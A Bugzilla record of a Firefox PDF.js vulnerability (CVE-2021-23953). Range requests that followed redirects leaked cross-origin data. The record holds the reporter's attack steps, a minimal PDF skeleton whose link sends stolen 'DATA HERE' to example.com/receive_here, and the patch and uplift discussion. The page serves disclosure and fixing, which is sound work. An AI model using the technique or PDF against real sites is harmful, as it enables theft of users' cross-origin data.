* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_e8295c2a_20250115_084520.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1683940)
* [XML](/show_bug.cgi?ctype=xml&id=1683940)

Closed
[Bug 1683940](/show_bug.cgi?id=1683940)
(CVE-2021-23953)

Opened 4 years ago
Closed 4 years ago

# Cross-origin information leakage via redirected PDF requests

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Cross-origin information leakage via redirected PDF requests

## Categories

### (Firefox :: PDF Viewer, defect)

[Product:](/describecomponents.cgi?product=Firefox)

Firefox
▾

Firefox
For bugs in Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the [Core](https://bugzilla.mozilla.org/describecomponents.cgi?product=Core) product. Bugs for developer tools (F12) should be filed in the [DevTools](https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools) product. ([more info](https://wiki.mozilla.org/Modules/All#Firefox))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox&component=PDF%20Viewer#PDF%20Viewer)

PDF Viewer
▾

Firefox :: PDF Viewer
For bugs related to Firefox's built-in PDF viewing capabilities (also known as pdf.js).
[See Open Bugs in This Component](/buglist.cgi?product=Firefox&component=PDF%20Viewer&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox&component=PDF%20Viewer&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox&component=PDF%20Viewer)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

86 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Priority | --- |
| --- | --- |
| Performance Impact | --- |
| Webcompat Score | --- |
| Accessibility Severity | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr78 | [85+](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=equals&v1=85%2B) | [verified](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=verified) |
| firefox84 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox84&o1=equals&v1=wontfix) |
| firefox85 | [+](/buglist.cgi?f1=cf_tracking_firefox85&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=verified) |
| firefox86 | [+](/buglist.cgi?f1=cf_tracking_firefox86&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox86&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr78 | 85+ | verified |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox84 |  | wontfix |
| firefox85 | + | verified |
| firefox86 | + | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: robwu, Assigned: bdahl)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/79f0e968c1f3c1077aaba34bb5ede0a1?d=mm&size=40)  [bdahl](/user_profile?user_id=425126)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/30e26944b9b786ea16fce8b18394c6e4?d=mm&size=40)  [robwu](/user_profile?user_id=447061)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/1c26d49ffb62a4106644da39c7e6fb4c?d=mm&size=40)  [calixte](/user_profile?user_id=560431)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

8 people

## References

### ( [URL](https://github.com/mozilla/pdf.js/issues/12744 "https://github.com/mozilla/pdf.js/issues/12744") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[github.com/mozilla/pdf.js/issues/12744](https://github.com/mozilla/pdf.js/issues/12744 "https://github.com/mozilla/pdf.js/issues/12744")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-sop, sec-high, Whiteboard: [adv-main85+][adv-esr78.7+][sec-survey])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2021-23953

[Keywords:](/describekeywords.cgi)

[csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main85+][adv-esr78.7+][sec-survey]

QA Whiteboard:

[qa-triaged][post-critsmash-triage]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | blocking-fx-sync1.7 | ? |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files, 1 obsolete file)

| [Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu](/attachment.cgi?id=9195266)  [4 years ago](#c5)  [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)   48 bytes, text/x-phabricator-request | jcristau : [approval-mozilla-beta+](#c12 "4 years ago")  RyanVM : [approval-mozilla-esr78+](#c15 "4 years ago")  tjr : [sec-approval+](#c8 "4 years ago") | [Details](/attachment.cgi?id=9195266&action=edit) | [Review](/attachment.cgi?id=9195266) |
| --- | --- | --- |
| [str-proxy.js](/attachment.cgi?id=9197753)  [4 years ago](#c18)  [Rob Wu [:robwu]](/user_profile?user_id=447061)   1.24 KB, application/x-javascript |  | [Details](/attachment.cgi?id=9197753&action=edit) |
| [advisory.txt](/attachment.cgi?id=9198101)  [4 years ago](#c20)  [Frederik Braun [:freddy]](/user_profile?user_id=428608)   240 bytes, text/plain |  | [Details](/attachment.cgi?id=9198101&action=edit) |
| [advisory.txt](/attachment.cgi?id=9198137)  [4 years ago](#c21)  [Frederik Braun [:freddy]](/user_profile?user_id=428608)   243 bytes, text/plain |  | [Details](/attachment.cgi?id=9198137&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Rob Wu [:robwu]](/user_profile?user_id=447061)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1683940#c0)• 4 years ago |
|  | |

I posted a write-up of a vulnerability in the networking code of PDF.js at <https://github.com/mozilla/pdf.js/issues/12744>

In short, when multiple network requests are sent for parts of the PDF file, responses that belong to a different origin (e.g. due to redirects) should be rejected. This does not happen.

After some code inspection, I found that the vulnerability can currently be exploited under some specific circumstances circumstances. The only requirements for exploitation are:

* Victim website (from where cross-origin data is stolen) responds to Range requests with HTTP 206.
  + note: the fact [that HTTP 206 is required](https://searchfox.org/mozilla-central/rev/5a90b263f71b558fd14bade65b0c4ae5e216e646/toolkit/components/pdfjs/content/PdfJsNetwork.jsm#171-183) slightly lessens the impact, since it means that servers that don't respond to Range requests (I suppose most regular web content would more likely respond with HTTP 200 than 206) aren't affected.
* Limited user interaction: User must click once in an attacker-controlled area (rendered PDF file).

To carry out the attack:

1. Prepare a server that serves the head and tail of a crafted PDF file that triggers the Range request mode of PDF (=loading PDF data in chunks over the network). In between the head and tail, at a well-chosen offset, there are redirects for Range requests to the victim website.
2. To the PDF viewer, the generated PDF file looks like a regular PDF file that contains a link (e.g. the `GoToR` action).
3. By the construction of the PDF at step 1, any click within the PDF file will trigger a navigation to the URL, and the URL will contain the cross-origin data (from the redirection target).
4. To execute the exploit, the user must be tricked into clicking in the PDF.

I haven't attached a PoC because I haven't bothered with constructing a PoC server with a good head/tail + offsets that triggers the vulnerable code path in PDF.js, but I did create such a PoC before in <https://crbug.com/653749> ([CVE-2016-5206](https://www.cve.org/CVERecord?id=CVE-2016-5206)).

|  | [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1683940#c1)• 4 years ago |
|  | |

As mentioned in the github bug, the easiest way to fix is use a `xhr.channel.QueryInterface(Ci.nsIHttpChannel).redirectionLimit = 0;` on the range requests, but it is more restrictive. I've got that working locally with some dummy servers, but I'm going to try and create some mochitests that we can land later. I'd also like to try the other way of verifying the origin, but unfortunately, with all the range requests and redirects the mochitest is not straightforward.

|  | [Rob Wu [:robwu]](/user_profile?user_id=447061)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1683940#c2)• 4 years ago |
|  | |

Rather than creating a PDF file that triggers the vulnerability, it may be easier to call `pdf.js.message` events to invoke the API and verifying that the message handler behaves as expected (i.e. rejects unexpected/cross-origin/non-PDF responses).

The original report here is about range requests. It just occurred to me that the non-range request variant can also be abused to perform universal reads of any website (simply by serving a PDF first without caching and then redirecting the same URL to an arbitrary destination of choice). That meant that IF an attacker manages to run code in the context of the PDF Viewer, that they can effectively send network requests and read its response without limitations.

That is a serious vulnerability on its own that would be patched by rejecting redirected requests.

Feel free to add me as a reviewer to any patch, I'll take a look despite being on PTO.

Summary: Cross-origin information leakage via range requests, requiring user interaction → Cross-origin information leakage via redirected PDF requests

|  | [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1683940#c3)• 4 years ago |
|  | |

In the Firefox case, how is data extracted? The onmessage/postmessage method used in the chrome exploit won't work with Firefox and pdf.js as far as I can tell.

|  | [Rob Wu [:robwu]](/user_profile?user_id=447061)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1683940#c4)• 4 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1683940&comment_id=15193892 "2 revisions") |
|  | |

(In reply to Brendan Dahl [:bdahl] (84 regression triage) from [comment #3](/show_bug.cgi?id=1683940#c3 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests"))

> In the Firefox case, how is data extracted? The onmessage/postmessage method used in the chrome exploit won't work with Firefox and pdf.js as far as I can tell.

Right - in Chrome it was possible to automate exploitation by using an accessibility API to exfiltrate data.

PDF.js does not have such an API yet (at least not until the WIP scripting capability is extended), so alternatives are:

* [comment 0](/show_bug.cgi?id=1683940#c0 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests"): trick the user into triggering a network request with the attacker's choice of payload.
* [comment 2](/show_bug.cgi?id=1683940#c2 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests"): find a separate vulnerability in PDF.js to have code execution in the viewer, and abuse the `pdf.js.message` handler + redirects to read data.

In more detail:

To exploit [comment 0](/show_bug.cgi?id=1683940#c0 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests"), you would stitch together a PDF file from different origins (possible due to redirects of PDF file). Below I wrote a minimal example of such a file, structurally. At "DATA HERE", the server would redirect. In practice the file needs more padding (and the server should intentionally slow down the response so that the PDF viewer is forced to perform a range request to prioritize the loading of the DATA HERE chunk).

To exploit [comment 2](/show_bug.cgi?id=1683940#c2 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests"), the attacker needs another vulnerability that enables an attacker to run code in the PDF viewer document. When an attacker can execute code in the viewer, it can trigger `pdf.js.message` events, one of which is [a mechanism to request data of the PDF file](https://searchfox.org/mozilla-central/rev/38ed718a101aca27db25984413c052ccd8c0ceda/toolkit/components/pdfjs/content/PdfStreamConverter.jsm#1226-1233,1242-1247). `PdfJsNetwork.jsm`'s `NetworkManager` is passed [the URL of the requested PDF file](https://searchfox.org/mozilla-central/rev/38ed718a101aca27db25984413c052ccd8c0ceda/toolkit/components/pdfjs/content/PdfStreamConverter.jsm#743), presumably to ensure that the unpriviled `resource://pdf.js` page only loads the PDF file. But because of the redirects, anything could be loaded.

Attachment below: minimal PDF file to showcase the requirements of the PDF that the attacker needs to send to exploit [comment 0](/show_bug.cgi?id=1683940#c0 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests"). To turn this into a full exploit, the attacker needs to add some padding inside the file and serve the PDF from an intentionally slow server, so that PDF.js uses range requests to try and request missing bytes. In this way, due to redirected range requests, it would be possible to steal `DATA HERE` (presumably data from a different server, after redirects).

```
%PDF-1.1
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Count 1/Kids[3 0 R]/MediaBox [0 0 200 100]>>
endobj
3 0 obj
<</Annots[5 0 R]/Type/Page/Parent 2 0 R/Resources<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Arial>>>>>>/Contents 4 0 R>>
endobj
4 0 obj
<</Length 43>>
stream
BT/F1 20 Tf 39 44 Td(Click this link) Tj ET
endstream
endobj
5 0 obj
<</A<</S/GoToR /Type/Action/F(http://example.com/receive_here)/D 6 0 R>>/H/P/Rect[0 0 200 100]/Subtype/Link/Type/Annot>>
endobj
6 0 obj
(DATA HERE)
endobj
xref
0 7
0000000000 65535 f
0000000008 00000 n
0000000054 00000 n
0000000128 00000 n
0000000269 00000 n
0000000360 00000 n
0000000496 00000 n
trailer
<</Root 1 0 R/Size 7>>
startxref
523
%%EOF

```

|  | [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1683940#c5)• 4 years ago |
|  | |

Attached file
[Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu](attachment.cgi?id=9195266)
— [Details](attachment.cgi?id=9195266&action=edit)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a1124477_600971)• 4 years ago |

Assignee: nobody → bdahlStatus: NEW → ASSIGNED

|  | [Rob Wu [:robwu]](/user_profile?user_id=447061)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1683940#c6)• 4 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1683940&comment_id=15201308 "1 revision") |
|  | |

Brendan, your patch in [comment 5](/show_bug.cgi?id=1683940#c5 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") fixes the vulnerability from [comment 0](/show_bug.cgi?id=1683940#c0 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests"), but not the vulnerability from [comment 2](/show_bug.cgi?id=1683940#c2 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") (more details for both in [comment 4](/show_bug.cgi?id=1683940#c4 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests")). Are you intentionally keeping the second vulnerability open (for a follow-up)?

An easy way to fix the issue from [comment 2](/show_bug.cgi?id=1683940#c2 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") is to also block redirects for non-range requests, but that is more likely going to cause regressions.

A less risky (i.e. not unnecessarily restrictive) way to resolve both issues at once is to check `xhr.responseURL` before processing the response.

I'll leave the choice to you.

EDIT: Brendan pointed out that the code path for the second issue is unreachable dead code. It's fine to proceed with just the fix for the bug from the initial bug report.

|  | [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1683940#c7)• 4 years ago |
|  | |

Comment on [attachment 9195266](/attachment.cgi?id=9195266 "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") [[details]](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu")

[Bug 1683940](/show_bug.cgi?id=1683940 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") - Don't follow redirects on range requests for PDFs. r=robwu

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not very easily, but the bug has been discussed publicly in <https://github.com/mozilla/pdf.js/issues/12744>
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Unknown
* **Which older supported branches are affected by this flaw?**: all
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Easy, code hasn't changed much in many versions. Should be the same patch.
* **How likely is this patch to cause regressions; how much testing does it need?**: Unlikely, there's the potential that ranged loading of PDFs that redirect requests would be slower to load, but we should fallback to streaming the PDF in that case. Our usual test suite should cover most of the normal cases for loading PDFs.
[Attachment #9195266](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") -
Flags: sec-approval?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a1770783_1689)• 4 years ago |

[status-firefox84](/buglist.cgi?f1=cf_status_firefox84&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox84&o1=equals&v1=wontfix)
[status-firefox85](/buglist.cgi?f1=cf_status_firefox85&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=affected)
[status-firefox86](/buglist.cgi?f1=cf_status_firefox86&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox86&o1=equals&v1=affected)
[status-firefox-esr78](/buglist.cgi?f1=cf_status_firefox_esr78&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=affected)
[tracking-firefox86](/buglist.cgi?f1=cf_tracking_firefox86&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox86&o1=equals&v1=%2B)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1683940#c8)• 4 years ago |
|  | |

Comment on [attachment 9195266](/attachment.cgi?id=9195266 "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") [[details]](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu")

[Bug 1683940](/show_bug.cgi?id=1683940 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") - Don't follow redirects on range requests for PDFs. r=robwu

Approved to land and request uplift

[Attachment #9195266](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") -
Flags: sec-approval? → sec-approval+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a1804816_1689)• 4 years ago |

[tracking-firefox85](/buglist.cgi?f1=cf_tracking_firefox85&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox85&o1=equals&v1=%2B)
[tracking-firefox-esr78](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=isnotempty):
--- → [85+](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=equals&v1=85%2B)Keywords: [csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1683940#c9)• 4 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/3fa0e1eb3dadb80ce67de82bdcfd655fe91dd1d0>

<https://hg.mozilla.org/mozilla-central/rev/3fa0e1eb3dad>

Group: firefox-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 4 years ago
[status-firefox86](/buglist.cgi?f1=cf_status_firefox86&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox86&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox86&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 86 Branch

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1683940#c10)• 4 years ago |
|  | |

Please submit the uplift request.

Flags: needinfo?(bdahl)

|  | [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1683940#c11)• 4 years ago |
|  | |

Comment on [attachment 9195266](/attachment.cgi?id=9195266 "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") [[details]](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu")

[Bug 1683940](/show_bug.cgi?id=1683940 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") - Don't follow redirects on range requests for PDFs. r=robwu

### Beta/Release Uplift Approval Request

* **User impact if declined**: Potential security bug.
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: No
* **Needs manual test from QE?**: Yes
* **If yes, steps to reproduce**: Ensure a large pdf loads correctly, e.g. <https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf>
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Small code change that has a fallback path.
* **String changes made/needed**: none
Flags: needinfo?(bdahl)
[Attachment #9195266](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") -
Flags: approval-mozilla-beta?

|  | [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1683940#a1984053_425126)• 4 years ago |

Flags: qe-verify+

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1683940#c12)• 4 years ago |
|  | |

Comment on [attachment 9195266](/attachment.cgi?id=9195266 "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") [[details]](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu")

[Bug 1683940](/show_bug.cgi?id=1683940 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") - Don't follow redirects on range requests for PDFs. r=robwu

approved for 85.0b9

[Attachment #9195266](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1683940#c13)• 4 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/b223972c5eb3>

[status-firefox85](/buglist.cgi?f1=cf_status_firefox85&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox85&o1=equals&v1=fixed)

|  | [Brendan Dahl [:bdahl]](/user_profile?user_id=425126)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1683940#c14)• 4 years ago |
|  | |

Comment on [attachment 9195266](/attachment.cgi?id=9195266 "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") [[details]](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu")

[Bug 1683940](/show_bug.cgi?id=1683940 "VERIFIED FIXED - Cross-origin information leakage via redirected PDF requests") - Don't follow redirects on range requests for PDFs. r=robwu

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**: Potential security bug.
* **Fix Landed on Version**: 86
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Small code change that has a fallback path.
* **String or UUID changes made by this patch**: none
[Attachment #9195266](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") -
Flags: approval-mozilla-esr78?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1683940#c15)• 4 years ago |
|  | |

Comment on [attachment 9195266](/attachment.cgi?id=9195266 "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu") [[details]](/attachment.cgi?id=9195266&action=edit "Bug 1683940 - Don't follow redirects on range requests for PDFs. r=robwu")

